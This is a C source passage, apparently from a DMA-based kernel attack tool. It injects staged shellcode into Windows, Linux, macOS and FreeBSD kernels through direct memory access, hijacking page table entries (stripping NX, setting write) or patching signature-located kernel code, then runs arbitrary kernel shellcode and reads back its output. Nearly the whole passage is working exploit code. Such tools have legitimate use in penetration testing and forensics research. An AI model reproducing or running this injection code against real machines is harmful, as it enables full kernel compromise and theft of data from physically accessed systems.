	DWORD dwSignatureMatchIdx, cSignatures = CONFIG_MAX_SIGNATURES;
	HRESULT hr;
	PKMDHANDLE_S12 ph1 = NULL, ph2 = NULL;
	PDWORD pdwPhysicalAddress;
	PKMDHANDLE pKMD = NULL;
	if(!(ph1 = LocalAlloc(LMEM_ZEROINIT, sizeof(KMDHANDLE_S12)))) { goto fail; }
	if(!(ph2 = LocalAlloc(LMEM_ZEROINIT, sizeof(KMDHANDLE_S12)))) { goto fail; }
	//------------------------------------------------
	// 1: Load signature
	//------------------------------------------------
	if(0 == _stricmp(pCfg->szKMDName, "LINUX_X64")) {
		if(!KMD_LinuxKernelSeekSignature(pCfg, pDeviceData, &oSignatures[0])) {
			printf("KMD: Failed. Error locating generic linux kernel signature.\n");
			goto fail;
		}
		pSignature = &oSignatures[0];
	} else if((0 == _stricmp(pCfg->szKMDName, "MACOS")) || (0 == _stricmp(pCfg->szKMDName, "OSX_X64"))) {
		if(!KMD_MacOSKernelSeekSignature(pCfg, pDeviceData, &oSignatures[0])) {
			printf("KMD: Failed. Error locating generic macOS kernel signature.\n");
			goto fail;
		}
		pSignature = &oSignatures[0];
	} else if(0 == _stricmp(pCfg->szKMDName, "FREEBSD_X64")) {
		if(!KMD_FreeBSDKernelSeekSignature(pCfg, pDeviceData, &oSignatures[0])) {
			printf("KMD: Failed. Error locating generic FreeBSD kernel signature.\n");
			goto fail;
		}
		pSignature = &oSignatures[0];
	} else {
		if(!Util_LoadSignatures(pCfg->szKMDName, ".kmd", oSignatures, &cSignatures, 5)) {
			printf("KMD: Failed. Error loading signatures.\n");
			goto fail;
		}
		//------------------------------------------------
		// 2: Locate patch location (scan memory).
		//------------------------------------------------
		hr = KMD_FindSignature1(pCfg, pDeviceData, oSignatures, cSignatures, &dwSignatureMatchIdx);
		if(FAILED(hr)) {
			printf("KMD: Failed. Could not find signature in memory.\n");
			goto fail;
		}
		pSignature = &oSignatures[dwSignatureMatchIdx];
	}
	if(!pSignature->chunk[2].cb || !pSignature->chunk[3].cb) {
		printf("KMD: Failed. Error loading shellcode.\n");
		goto fail;
	}
	//------------------------------------------------
	// 3: Set up patch data.
	//------------------------------------------------
	ph1->dwPageAddr32 = (DWORD)pSignature->chunk[0].qwAddress;
	ph2->dwPageAddr32 = (DWORD)pSignature->chunk[1].qwAddress;
	ph1->dwPageOffset = 0xfff & pSignature->chunk[2].cbOffset;
	ph2->dwPageOffset = 0xfff & pSignature->chunk[3].cbOffset;
	DeviceReadDMA(pDeviceData, ph1->dwPageAddr32, ph1->pbOrig, 4096, PCILEECH_MEM_FLAG_RETRYONFAIL);
	DeviceReadDMA(pDeviceData, ph2->dwPageAddr32, ph2->pbOrig, 4096, PCILEECH_MEM_FLAG_RETRYONFAIL);
	memcpy(ph1->pbPatch, ph1->pbOrig, 4096);
	memcpy(ph2->pbPatch, ph2->pbOrig, 4096);
	memcpy(ph1->pbPatch + ph1->dwPageOffset, pSignature->chunk[2].pb, pSignature->chunk[2].cb);
	memcpy(ph2->pbPatch + ph2->dwPageOffset, pSignature->chunk[3].pb, pSignature->chunk[3].cb);
	// patch jump offset in stage1
	*(PDWORD)(ph1->pbPatch + ph1->dwPageOffset + STAGE1_OFFSET_CALL_ADD) += pSignature->chunk[3].cbOffset - pSignature->chunk[2].cbOffset;
	// patch original stage1 data in stage2 (needed for stage1 restore)
	memcpy(ph2->pbPatch + ph2->dwPageOffset + STAGE2_OFFSET_FN_STAGE1_ORIG, ph1->pbOrig + ph1->dwPageOffset, 8);
	// patch offset to extra function relative to stage2 entry point: windows = n/a, linux=kallsyms_lookup_name, mac=kernel_mach-o_header
	*(PDWORD)(ph2->pbPatch + ph2->dwPageOffset + STAGE2_OFFSET_EXTRADATA1) = pSignature->chunk[4].cbOffset - pSignature->chunk[3].cbOffset;
	//------------------------------------------------
	// 4: Write patched data to memory.
	//------------------------------------------------
	if(!DeviceWriteDMAVerify(pDeviceData, ph2->dwPageAddr32, ph2->pbPatch, 4096, PCILEECH_MEM_FLAG_RETRYONFAIL)) {
		printf("KMD: Failed. Signature found but unable write #2.\n");
		goto fail;
	}
	if(!DeviceWriteDMA(pDeviceData, ph1->dwPageAddr32, ph1->pbPatch, 4096, 0)) { // stage1 (must be written after stage2)
		printf("KMD: Failed. Signature found but unable write #1.\n");
		goto fail;
	}
	printf("KMD: Code inserted into the kernel - Waiting to receive execution.\n");
	//------------------------------------------------
	// 5: wait for patch to reveive execution.
	//------------------------------------------------
	pdwPhysicalAddress = (PDWORD)(ph2->pbLatest + ph2->dwPageOffset + STAGE2_OFFSET_STAGE3_PHYSADDR);
	do {
		Sleep(100);
		if(!DeviceReadDMA(pDeviceData, ph2->dwPageAddr32, ph2->pbLatest, 4096, PCILEECH_MEM_FLAG_RETRYONFAIL)) {
			printf("KMD: Failed. DMA Read failed while waiting to receive physical address.\n");
			goto fail;
		}
	} while(!*pdwPhysicalAddress);
	printf("KMD: Execution received - continuing ...\n");
	//------------------------------------------------
	// 6: Restore hooks to original.
	//------------------------------------------------
	DeviceWriteDMA(pDeviceData, ph2->dwPageAddr32, ph2->pbOrig, 4096, 0);
	//------------------------------------------------
	// 7: Set up kernel module shellcode (stage3)
	//------------------------------------------------
	if(*pdwPhysicalAddress == 0xffffffff) {
		printf("KMD: Failed. Stage2 shellcode error.\n");
		goto fail;
	}
	DeviceWriteDMA(pDeviceData, *pdwPhysicalAddress + 0x1000, pSignature->chunk[4].pb, 4096, 0);
	if(!(pKMD = LocalAlloc(LMEM_ZEROINIT, sizeof(KMDHANDLE)))) { goto fail; }
	pKMD->dwPageAddr32 = *pdwPhysicalAddress;
	pKMD->status = (PKMDDATA)pKMD->pbPageData;
	DeviceReadDMA(pDeviceData, pKMD->dwPageAddr32, pKMD->pbPageData, 4096, 0);
	//------------------------------------------------
	// 8: Retrieve physical memory range map and complete open action.
	//------------------------------------------------
	if(!KMD_GetPhysicalMemoryMap(pCfg, pDeviceData, pKMD)) {
		printf("KMD: Failed. Failed to retrieve physical memory map.\n");
		goto fail;
	}
	LocalFree(ph1);
	LocalFree(ph2);
	pDeviceData->KMDHandle = (HANDLE)pKMD;
	if(pCfg->tpAction == KMDLOAD) { pCfg->qwKMD = pKMD->dwPageAddr32; }
	return TRUE;
fail:
	if(ph1) { LocalFree(ph1); }
	if(ph2) { LocalFree(ph2); }
	if(pKMD) { LocalFree(pKMD); }
	return FALSE;
}

BOOL KMDOpen_PageTableHijack(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData)
{
	QWORD qwCR3 = pCfg->qwCR3;
	QWORD qwModuleBase;
	SIGNATURE oSignatures[CONFIG_MAX_SIGNATURES];
	PSIGNATURE pSignature;
	DWORD cSignatures = CONFIG_MAX_SIGNATURES;
	PKMDHANDLE_S12 ph1 = NULL, ph2 = NULL;
	PSIGNATUREPTE pSignaturePTEs;
	QWORD cSignaturePTEs;
	PKMDHANDLE pKMD = NULL;
	PDWORD pdwPhysicalAddress;
	BOOL result;
	//------------------------------------------------
	// 1: Load signature and patch data.
	//------------------------------------------------
	result = Util_LoadSignatures(pCfg->szKMDName, ".kmd", oSignatures, &cSignatures, 6);
	if(!result) {
		printf("KMD: Failed. Error loading signatures.\n");
		goto fail;
	}
	if(cSignatures != 1) {
		printf("KMD: Failed. Singature count differs from 1. Exactly one signature must be loaded.\n");
		goto fail;
	}
	pSignature = &oSignatures[0];
	if(pSignature->chunk[0].cb != 4096 || pSignature->chunk[1].cb != 4096) {
		printf("KMD: Failed. Signatures in PTE mode must be 4096 bytes long.\n");
		goto fail;
	}
	pSignaturePTEs = (PSIGNATUREPTE)pSignature->chunk[5].pb;
	cSignaturePTEs = pSignature->chunk[5].cb / sizeof(SIGNATUREPTE);
	if(!(ph1 = LocalAlloc(LMEM_ZEROINIT, sizeof(KMDHANDLE_S12)))) { goto fail; }
	if(!(ph2 = LocalAlloc(LMEM_ZEROINIT, sizeof(KMDHANDLE_S12)))) { goto fail; }
	//------------------------------------------------
	// 2: Locate patch location PTEs.
	//------------------------------------------------
	if(pCfg->fPageTableScan) {
		printf("KMD: Searching for PTE location ...\n");
	}
	result = Util_PageTable_FindSignatureBase(pCfg, pDeviceData, &qwCR3, pSignaturePTEs, cSignaturePTEs, &qwModuleBase);
	if(!result) {
		printf("KMD: Failed. Could not find module base by PTE search.\n");
		goto fail;
	}
	result = Util_PageTable_ReadPTE(pCfg, pDeviceData, qwCR3, qwModuleBase + pSignature->chunk[2].cbOffset, &ph1->qwPTEOrig, &ph1->qwPTEAddrPhys);
	if(!result) {
		printf("KMD: Failed. Could not access PTE #1.\n");
		goto fail;
	}
	result = Util_PageTable_ReadPTE(pCfg, pDeviceData, qwCR3, qwModuleBase + pSignature->chunk[3].cbOffset, &ph2->qwPTEOrig, &ph2->qwPTEAddrPhys);
	if(!result) {
		printf("KMD: Failed. Could not access PTE #2.\n");
		goto fail;
	}
	//------------------------------------------------
	// 3: Set up patch data.
	//------------------------------------------------
	// hijack "random" page in memory if target page is above 4GB - dangerous!!!
	ph1->dwPageAddr32 = (ph1->qwPTEOrig < 0x100000000) ? (ph1->qwPTEOrig & 0xfffff000) : 0x90000; 
	ph2->dwPageAddr32 = (ph2->qwPTEOrig < 0x100000000) ? (ph2->qwPTEOrig & 0xfffff000) : 0x91000;
	ph1->dwPageOffset = 0xfff & pSignature->chunk[2].cbOffset;
	ph2->dwPageOffset = 0xfff & pSignature->chunk[3].cbOffset;
	memcpy(ph1->pbPatch, pSignature->chunk[0].pb, 4096);
	memcpy(ph2->pbPatch, pSignature->chunk[1].pb, 4096);
	memcpy(ph1->pbPatch + ph1->dwPageOffset, pSignature->chunk[2].pb, pSignature->chunk[2].cb);
	memcpy(ph2->pbPatch + ph2->dwPageOffset, pSignature->chunk[3].pb, pSignature->chunk[3].cb);
	// patch jump offset in stage1
	*(PDWORD)(ph1->pbPatch + ph1->dwPageOffset + STAGE1_OFFSET_CALL_ADD) += pSignature->chunk[3].cbOffset - pSignature->chunk[2].cbOffset;
	// patch original stage1 data in stage2 (needed for stage1 restore)
	memcpy(ph2->pbPatch + ph2->dwPageOffset + STAGE2_OFFSET_FN_STAGE1_ORIG, pSignature->chunk[0].pb + ph1->dwPageOffset, 8);
	// patch offset to extra function relative to stage2 entry point: windows = n/a, linux=kallsyms_lookup_name
	*(PDWORD)(ph2->pbPatch + ph2->dwPageOffset + STAGE2_OFFSET_EXTRADATA1) = pSignature->chunk[4].cbOffset - pSignature->chunk[3].cbOffset;
	// calculate new PTEs
	ph1->qwPTE = 0x7ff0000000000fff & ph1->qwPTEOrig; // Strip NX-bit and previous physical address
	ph2->qwPTE = 0x7ff0000000000fff & ph2->qwPTEOrig; // Strip NX-bit and previous physical address
	ph1->qwPTE |= 0x00000002; // set write
	ph2->qwPTE |= 0x00000002; // set write
	ph1->qwPTE |= 0xfffff000 & ph1->dwPageAddr32;
	ph2->qwPTE |= 0xfffff000 & ph2->dwPageAddr32;
	//------------------------------------------------
	// 4: Write patched data and PTEs to memory.
	//------------------------------------------------
	DeviceReadDMA(pDeviceData, ph1->dwPageAddr32, ph1->pbOrig, 4096, 0);
	DeviceReadDMA(pDeviceData, ph2->dwPageAddr32, ph2->pbOrig, 4096, 0);
	if(!DeviceWriteDMAVerify(pDeviceData, ph2->dwPageAddr32, ph2->pbPatch, 4096, PCILEECH_MEM_FLAG_RETRYONFAIL) ||
		!DeviceWriteDMAVerify(pDeviceData, ph1->dwPageAddr32, ph1->pbPatch, 4096, PCILEECH_MEM_FLAG_RETRYONFAIL)) {
		printf("KMD: Failed. Signature found but unable write.\n");
		goto fail;
	}
	DeviceWriteDMA(pDeviceData, ph2->qwPTEAddrPhys, (PBYTE)&ph2->qwPTE, sizeof(QWORD), 0);
	Sleep(250);
	DeviceWriteDMA(pDeviceData, ph1->qwPTEAddrPhys, (PBYTE)&ph1->qwPTE, sizeof(QWORD), 0);
	//------------------------------------------------
	// 5: wait for patch to reveive execution.
	//------------------------------------------------
	printf("KMD: Page Table hijacked - Waiting to receive execution.\n");
	pdwPhysicalAddress = (PDWORD)(ph2->pbLatest + ph2->dwPageOffset + STAGE2_OFFSET_STAGE3_PHYSADDR);
	do {
		Sleep(100);
		if(!DeviceReadDMA(pDeviceData, ph2->dwPageAddr32, ph2->pbLatest, 4096, PCILEECH_MEM_FLAG_RETRYONFAIL)) {
			printf("KMD: Failed. DMA Read failed while waiting to receive physical address.\n");
			goto fail;
		}
	} while(!*pdwPhysicalAddress);
	printf("KMD: Execution received - continuing ...\n");
	//------------------------------------------------
	// 6: Restore hijacked memory pages.
	//------------------------------------------------
	DeviceWriteDMA(pDeviceData, ph1->qwPTEAddrPhys, (PBYTE)&ph1->qwPTEOrig, sizeof(QWORD), 0);
	DeviceWriteDMA(pDeviceData, ph2->qwPTEAddrPhys, (PBYTE)&ph2->qwPTEOrig, sizeof(QWORD), 0);
	Sleep(100);
	DeviceWriteDMA(pDeviceData, ph1->dwPageAddr32, ph1->pbOrig, 4096, 0);
	DeviceWriteDMA(pDeviceData, ph2->dwPageAddr32, ph2->pbOrig, 4096, 0);
	//------------------------------------------------
	// 7: Set up kernel module shellcode (stage3)
	//------------------------------------------------
	if(*pdwPhysicalAddress == 0xffffffff) {
		printf("KMD: Failed. Stage2 shellcode error.\n");
		goto fail;
	}
	DeviceWriteDMA(pDeviceData, *pdwPhysicalAddress + 0x1000, pSignature->chunk[4].pb, 4096, 0);
	if(!(pKMD = LocalAlloc(LMEM_ZEROINIT, sizeof(KMDHANDLE)))) { goto fail; }
	pKMD->dwPageAddr32 = *pdwPhysicalAddress;
	pKMD->status = (PKMDDATA)pKMD->pbPageData;
	DeviceReadDMA(pDeviceData, pKMD->dwPageAddr32, pKMD->pbPageData, 4096, 0);
	//------------------------------------------------
	// 8: Retrieve physical memory range map and complete open action.
	//------------------------------------------------
	if(!KMD_GetPhysicalMemoryMap(pCfg, pDeviceData, pKMD)) {
		printf("KMD: Failed. Failed to retrieve physical memory map.\n");
		goto fail;
	}
	LocalFree(ph1);
	LocalFree(ph2);
	pDeviceData->KMDHandle = (HANDLE)pKMD;
	if(pCfg->tpAction == KMDLOAD) { pCfg->qwKMD = pKMD->dwPageAddr32; }
	return TRUE;
fail:
	if(ph1) { LocalFree(ph1); }
	if(ph2) { LocalFree(ph2); }
	if(pKMD) { LocalFree(pKMD); }
	return FALSE;
}

BOOL KMDOpen_LoadExisting(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData)
{
	PKMDHANDLE pKMD = NULL;
	//------------------------------------------------
	// 1: Set up handle to existing shellcode
	//------------------------------------------------
	if(!(pKMD = LocalAlloc(LMEM_ZEROINIT, sizeof(KMDHANDLE)))) { goto fail; }
	pKMD->dwPageAddr32 = (DWORD)pCfg->qwKMD;
	pKMD->status = (PKMDDATA)pKMD->pbPageData;
	if(!DeviceReadDMA(pDeviceData, pKMD->dwPageAddr32, pKMD->pbPageData, 4096, PCILEECH_MEM_FLAG_RETRYONFAIL)) {
		printf("KMD: Failed. Read failed @ address: 0x%08x\n", pKMD->dwPageAddr32);
	}
	if(pKMD->status->MAGIC != 0x0ff11337711333377) {
		printf("KMD: Failed. Not a valid KMD @ address: 0x%08x\n", pKMD->dwPageAddr32);
		goto fail;
	}
	//------------------------------------------------ 
	// 2: Retrieve physical memory range map and complete open action.
	//------------------------------------------------
	if(!KMD_GetPhysicalMemoryMap(pCfg, pDeviceData, pKMD)) {
		printf("KMD: Failed. Failed to retrieve physical memory map.\n");
		goto fail;
	}
	pDeviceData->KMDHandle = (HANDLE)pKMD;
	return TRUE;
fail:
	if(pKMD) { LocalFree(pKMD); }
	return FALSE;
}

BOOL KMDOpen(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData)
{
	if(pCfg->qwKMD) {
		return KMDOpen_LoadExisting(pCfg, pDeviceData);
	} else if(pCfg->qwCR3 || pCfg->fPageTableScan) {
		return KMDOpen_PageTableHijack(pCfg, pDeviceData);
	} else if(0 == _stricmp(pCfg->szKMDName, "WIN10_X64")) {
		return KMDOpen_HalHeapHijack(pCfg, pDeviceData);
	} else {
		return KMDOpen_MemoryScan(pCfg, pDeviceData);
	}
}

VOID ActionExecShellcode(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData)
{
	const DWORD CONFIG_SHELLCODE_MAX_BYTES_OUT_PRINT = 8192;
	BOOL result;
	PKMDEXEC pKmdExec = NULL;
	PKMDHANDLE phKMD = pDeviceData->KMDHandle;
	PBYTE pbBuffer = NULL;
	PSTR szBufferText = NULL;
	DWORD cbBufferText, cbLength, cbMaxBufferSize;
	HANDLE hFile = NULL;
	if(!phKMD) {
		printf("EXEC: Failed. Retrieving page info requires an active kernel module (KMD). Please use in conjunction with the -kmd option only.\n");
		goto fail;
	}
	//------------------------------------------------ 
	// 1: Load KMD shellcode and commit to target memory.
	//------------------------------------------------
	result = Util_LoadKmdExecShellcode(pCfg->szShellcodeName, &pKmdExec);
	if(!result) {
		printf("EXEC: Failed loading shellcode from file: '%s.ksh' ...\n", pCfg->szShellcodeName);
		goto fail;
	}
	result = DeviceWriteDMAVerify(pDeviceData, phKMD->status->DMAAddrPhysical, pKmdExec->pbShellcode, (DWORD)pKmdExec->cbShellcode, PCILEECH_MEM_FLAG_RETRYONFAIL);
	if(!result) {
		printf("EXEC: Failed writing shellcode to target memory.\n");
		goto fail;
	}
	//------------------------------------------------ 
	// 2: Set up indata and write to target memory.
	//------------------------------------------------
	cbMaxBufferSize = (DWORD)(phKMD->status->DMASizeBuffer - 0x100000) / 2;
	phKMD->status->dataInExtraOffset = 0x100000;	// 1MB
	phKMD->status->dataInExtraLength = 0;
	phKMD->status->dataInExtraLengthMax = cbMaxBufferSize;
	phKMD->status->dataOutExtraOffset = 0x100000 + cbMaxBufferSize;
	phKMD->status->dataOutExtraLength = 0;
	phKMD->status->dataOutExtraLengthMax = cbMaxBufferSize;
	memcpy(phKMD->status->dataIn, pCfg->qwDataIn, sizeof(QWORD) * 10);
	memcpy(phKMD->status->dataInStr, pCfg->szInS, MAX_PATH);
	memset(phKMD->status->dataOut, 0, sizeof(QWORD) * 10);
	memset(phKMD->status->dataOutStr, 0, MAX_PATH);
	if(pCfg->cbIn) {
		if(pCfg->cbIn > cbMaxBufferSize) { 
			printf("EXEC: Failed writing data - more than %iMB is not supported.\n", cbMaxBufferSize / (1024*1024));
			goto fail;
		}
		result = DeviceWriteDMA(pDeviceData, phKMD->status->DMAAddrPhysical + phKMD->status->dataInExtraOffset, pCfg->pbIn, (DWORD)((pCfg->cbIn + 0xfff) & ~0xfff), 0);
		if(!result) {
			printf("EXEC: Failed writing data to target memory.\n");
			goto fail;
		}
		phKMD->status->dataInExtraLength = pCfg->cbIn;
	}
	phKMD->status->dataInConsoleBuffer = 0;
	phKMD->status->dataOutConsoleBuffer = 0;
	//------------------------------------------------ 
	// 3: Execute! and display result.
	//------------------------------------------------
	KMD_SubmitCommand(pDeviceData, phKMD, KMD_CMD_VOID);
	result = KMD_SubmitCommand(pDeviceData, phKMD, KMD_CMD_EXEC);
	if(!result) {
		printf("EXEC: Failed sending execute command to KMD.\n");
		goto fail;
	}
	printf("EXEC: SUCCESS! shellcode should now execute in kernel!\nPlease see below for results.\n\n");
	printf(pKmdExec->szOutFormatPrintf,
		phKMD->status->dataOutStr,
		phKMD->status->dataOut[0],
		phKMD->status->dataOut[1],
		phKMD->status->dataOut[2],
		phKMD->status->dataOut[3],
		phKMD->status->dataOut[4],
		phKMD->status->dataOut[5],
		phKMD->status->dataOut[6],
		phKMD->status->dataOut[7],
		phKMD->status->dataOut[8],
		phKMD->status->dataOut[9]);
	//------------------------------------------------ 
	// 4: Display/Write additional output.
	//------------------------------------------------
	if(phKMD->status->dataOutExtraLength > 0) {
		// read extra output buffer
		if(!(pbBuffer = LocalAlloc(LMEM_ZEROINIT, cbMaxBufferSize)) ||
			!DeviceReadDMA(pDeviceData, phKMD->status->DMAAddrPhysical + phKMD->status->dataOutExtraOffset, pbBuffer, cbMaxBufferSize, 0)) {
			printf("EXEC: Error reading output.\n");
			goto fail;
		}
		// print to screen
		cbLength = (DWORD)phKMD->status->dataOutExtraLength;
		if(phKMD->status->dataOutExtraLength > CONFIG_SHELLCODE_MAX_BYTES_OUT_PRINT) {
			printf("EXEC: Large output. Only displaying first %i bytes.\n", CONFIG_SHELLCODE_MAX_BYTES_OUT_PRINT);
			cbLength = CONFIG_SHELLCODE_MAX_BYTES_OUT_PRINT;
		}
		if( CryptBinaryToStringA(pbBuffer, cbLength, CRYPT_STRING_HEXASCIIADDR, NULL, &cbBufferText) &&
			(szBufferText = (LPSTR)LocalAlloc(LMEM_ZEROINIT, cbBufferText)) &&
			CryptBinaryToStringA(pbBuffer, cbLength, CRYPT_STRING_HEXASCIIADDR, szBufferText, &cbBufferText)) {
			printf("%s\n", szBufferText);
		}
		// write to out file
		if(pCfg->szFileOut[0]) {
			hFile = CreateFileA(pCfg->szFileOut, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
			if(!hFile) {
				printf("EXEC: Error writing output to file.\n");
				goto fail;
			}
			if(!WriteFile(hFile, pbBuffer, (DWORD)phKMD->status->dataOutExtraLength, &cbLength, NULL)) {
				printf("EXEC: Error writing output to file.\n");
				goto fail;
			}
			printf("EXEC: Wrote %i bytes to file %s.\n", cbLength, pCfg->szFileOut);
		}
	}
	//------------------------------------------------ 
	// 5: Call console redirection if needed.
	//------------------------------------------------
	if(phKMD->status->dataInConsoleBuffer || phKMD->status->dataOutConsoleBuffer) {
		ActionConsoleRedirect(pCfg, pDeviceData, phKMD->status->dataInConsoleBuffer, phKMD->status->dataOutConsoleBuffer);
	}
	printf("\n");
fail:
	LocalFree(pKmdExec);
	LocalFree(pbBuffer);
	LocalFree(szBufferText);
	if(hFile) { CloseHandle(hFile); }
}